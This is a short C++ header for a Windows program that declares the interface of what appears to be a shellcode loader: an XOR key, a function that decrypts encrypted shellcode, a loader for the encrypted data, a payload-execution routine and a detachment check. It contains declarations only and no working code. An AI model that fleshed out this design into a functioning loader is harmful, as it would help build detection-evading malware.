#ifndef LOADER_HPP
# define LOADER_HPP

# include <windows.h>
# include <vector>
# include <cstdint>
# include <fstream>
# include <cstring>

extern const uint8_t XOR_KEY[];
extern const size_t XOR_KEY_LEN;

std::vector<uint8_t> decrypt_shellcode(const std::vector<uint8_t>& encrypted);
std::vector<uint8_t> load_encrypted_data();
void execute_payload();
bool is_already_detached();

#endif